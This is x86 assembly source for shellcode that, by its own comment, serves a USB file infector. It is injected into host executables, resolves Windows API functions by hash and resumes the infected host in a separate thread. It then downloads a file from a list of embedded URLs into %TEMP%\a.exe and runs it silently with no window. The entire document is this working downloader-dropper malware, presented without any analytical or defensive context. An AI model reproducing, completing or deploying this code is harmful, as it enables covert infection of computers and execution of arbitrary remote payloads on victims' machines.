; CONSTANTS
%define	SC0_STACK_SIZE			256
%define MAX_PATH				512
%define CREATE_NO_WINDOW		0x08000000

%define SC0_HOSTOEP				0
%define SC0_LOADLIBRARY			4
%define SC0_CREATEPROCESS		8
%define SC0_CREATETHREAD		12
%define	SC0_DOWNLOAD			16
%define SC0_ENVIRONMENT			20
%define SC0_FIRST_LINK			24

; STACK
%define SC0_ENTRY_POINT			[ebp - 4]
%define SC0_HOST_OEP			[ebp - 8]
%define SC0_KERNEL32			[ebp - 12]
%define SC0_DATA				[ebp - 16]
%define SC0_URLMON				[ebp - 20]
%define SC0_MODBASE				[ebp - 24]
%define SC0_PATH				[ebp - 28]

; FUNCTION ABSOLUTES
%define SC0_FLOADLIBRARY		[ebp - 64]
%define SC0_FCREATEPROCESS		[ebp - 68]
%define SC0_FCREATETHREAD		[ebp - 72]
%define SC0_FDOWNLOAD			[ebp - 76]
%define SC0_FENVIRONMENT		[ebp - 80]

section .text
	global _start

_start:
	nop

	; Shellcode for exe payloads in USB infect


; kernel32:
;	LoadLibraryA
; urlmon:
;	URLDownloadToFileA

	call	start_delta

	; Delta entry point
start_delta:
	pop		esi							; eip

	; Build frame & zero
	push	ebp
	mov		ebp, esp
	mov		ecx, SC0_STACK_SIZE
	sub		esp, ecx
	mov		edi, esp
	xor		al, al
	cld
	rep		stosb						; Zero

	; Compute data offsets
	xchg	esi, edi
	sub		edi, 6						; Realign to EP
	mov		SC0_ENTRY_POINT, edi		; Commit
	xor		ecx, ecx
	not		ecx							; Whole mem range 
sc0_find_data:
	mov		al, 0edh
	repne	scasb
	mov		eax, [edi - 1]
	shr		eax, 8
	cmp		al, 0f1h
	jne		sc0_find_data
	shr		eax, 8
	cmp		ax, 0eb89h
	jne		sc0_find_data
	lea		edi, [edi + 3]
	mov		SC0_DATA, edi

	; Get kernel32 base -- FIXME
	mov		eax, [fs:0x030]
	mov		eax, [eax + 0ch]
	mov		eax, [eax + 014h]
	mov		eax, [eax]
	mov		eax, [eax]
	mov		eax, [eax + 010h]
	mov		SC0_KERNEL32, eax

	; Resolve LoadLibraryA
	mov		esi, [edi + SC0_LOADLIBRARY]
	call	sc0_resolve_function
	mov		SC0_FLOADLIBRARY, eax

	; Resolve CreateProcessA
	mov		esi, SC0_DATA
	mov		esi, [esi + SC0_CREATEPROCESS]
	mov		eax, SC0_KERNEL32
	call	sc0_resolve_function
	mov		SC0_FCREATEPROCESS, eax

	; Resolve CreateThread
	mov		esi, SC0_DATA
	mov		esi, [esi + SC0_CREATETHREAD]
	mov		eax, SC0_KERNEL32
	call	sc0_resolve_function
	mov		SC0_FCREATETHREAD, eax

	; Resolve GetEnvironmentVariableA
	mov		esi, SC0_DATA
	mov		esi, [esi + SC0_ENVIRONMENT]
	mov		eax, SC0_KERNEL32
	call	sc0_resolve_function
	mov		SC0_FENVIRONMENT, eax

	; Load urlm on.d ll
	push	'll'
	push	'on.d' ;'d.no'
	push	'urlm' ;'mlru'
	push	esp
	mov		eax, SC0_FLOADLIBRARY
	call	eax
	add		esp, 12
	mov		SC0_URLMON, eax

	; Resolve URLDownloadToFileA
	mov		esi, SC0_DATA
	mov		esi, [esi + SC0_DOWNLOAD]
	call	sc0_resolve_function
	mov		SC0_FDOWNLOAD, eax

	; Reserve space for our tmp variable
	mov		ecx, MAX_PATH
	sub		esp, ecx
	mov		edi, esp
	xor		al, al
	rep		stosb
				
	mov		ebx, esp
	push	0
	push	'TEMP' ;'PMET'
	mov		edx, esp

	push	MAX_PATH
	push	ebx
	push	edx
	mov		eax, SC0_FENVIRONMENT
	call	eax

	add		esp, 8
	mov		SC0_PATH, esp

	; Append file name to end of string
	mov		edi, esp
	xor		eax, eax
	mov		ecx, eax
	not		ecx
	repne	scasb
	mov		byte [edi - 1], '\'
	mov		dword [edi], 'a.ex' ;'xe.a'
	mov		byte [edi + 4], 'e'

	; Get our module base
	mov		eax, SC0_ENTRY_POINT
	and		eax, 0ffff0000h
sc0_base_loop:
	cmp		word [eax], 'MZ'
	je		sc0_compute_oep_rva
	sub		eax, 1000h
	jmp		sc0_base_loop

	; Compute host OEP
sc0_compute_oep_rva:
	mov		SC0_MODBASE, eax
	mov		ebx, SC0_DATA
	add		eax, [ebx]

	; CreateThread
	push	0
	push	0
	push	0
	push	eax
	push	0
	push	0
	mov		eax, SC0_FCREATETHREAD
	call	eax

	; Download loop
	mov		ebx, SC0_DATA
	lea		ebx, [ebx + SC0_FIRST_LINK]
sc0_downloader:

	; %Use rPro file %\a. exe\0
	push	0				; LPBINDSTATUSCALLBACK
	push	0				; Reserved
	push	dword SC0_PATH  ; FileName
	push	ebx				; URL
	push	0
	mov		eax, SC0_FDOWNLOAD
	call	eax

	cmp		eax, 0
	je		sc0_downloader_execute

	; Download failed - Get to next string
	mov		edi, ebx
	xor		eax, eax
	mov		ecx, eax
	not		ecx
	cld
	repne 	scasb
	mov		ebx, edi
	cmp		byte [ebx], 0
	jne		sc0_downloader

	; We're out of links, they all failed
	mov		ebx, SC0_DATA
	lea		ebx, [ebx + SC0_FIRST_LINK]
	jmp		sc0_downloader

	; Download succeeded - execute payload
sc0_downloader_execute:

	lea		eax, [ebp - 104]
	push	eax
	lea		eax, [ebp - 156]
	push	eax
	push	0
	push	0
	push	CREATE_NO_WINDOW
	push	0
	push	0
	push	0
	push	dword SC0_PATH
	push	0
	mov		eax, SC0_FCREATEPROCESS
	call	eax

	; Normalize and return
	add		esp, (SC0_STACK_SIZE + MAX_PATH)
	pop		ebp
	ret

	; Expects	eax = module base
	;			esi = function hash
	; Returns  eax = address of function
sc0_resolve_function:

	; Find PE
	mov		ebx, [eax + 03ch]
	add		ebx, eax					; PE
	mov		edi, eax					; Commit to edi

	; Find EAT
	mov		ebx, [ebx + 078h]			
	add		ebx, edi					; IMAGE_EXPORT_DIRECTORY
	mov		edx, ebx

	; Find tables
	mov		ebx, [ebx + 020h]			; AddressOfNames
	add		ebx, edi

	; ecx = hash
	; ebx = AddressOfNames table
	; edx = AddressOfFunctions table
	; edi = base

	; Find first function string
	xor		ecx, ecx
sc0_enum_functions:
	mov		eax, [ebx]
	add		eax, edi
	call	sc0_crc32
	cmp		eax, esi
	je		sc0_found_function
	add		ebx, 4
	inc		ecx
	jmp		sc0_enum_functions

sc0_found_function:
	;mov		eax, [ebx]
	;add		eax, edi

	mov		ebx, [edx + 024h]
	add		ebx, edi
	mov		cx, [ebx + 2 * ecx]
	mov		ebx, [edx + 01ch]
	add		ebx, edi
	mov		eax, [ebx + 4 * ecx]
	add		eax, edi

	ret

	; Expects	eax = string
	; Returns  eax = CRC32
sc0_crc32:
	push	ebx
	push	ecx
	xor		ebx, ebx
	dec		ebx
sc0_crc32_byte:
	xor		bl, [eax]
	mov		ecx, 8
sc0_crc32_bit:
	shr		ebx, 1
	jnc		sc0_crc32_skip
	xor		ebx, 08fdb125ch
sc0_crc32_skip:
	loop	sc0_crc32_bit

	inc		eax
	cmp		byte [eax], 0
	jnz		sc0_crc32_byte

	mov		eax, ebx
	pop		ecx
	pop		ebx
	ret						



	; Signature & return address

	; Data sig
	db	0edh
	db	0f1h
	db	089h
	db	0ebh

	; Host OEP
	db	0
	db	0
	db	0
	db	0	

	; Function signatures

	; 3E07577B - LoadLibraryA
	db	07bh
	db	057h
	db	007h
	db	03eh

	; BB2D3AC0 - CreateProcessA
	db	0c0h
	db	03ah
	db	02dh
	db	0bbh

	; AAB04715 - CreateThread
	db	015h
	db	047h
	db	0b0h
	db	0aah

	; 395866BE - URLDownloadToFileA
	db	0beh
	db	066h
	db	058h
	db	039h

	; EDE19D36 - GetEnvironmentVariableA
	db	036h
	db	09dh
	db	0e1h
	db	0edh
	

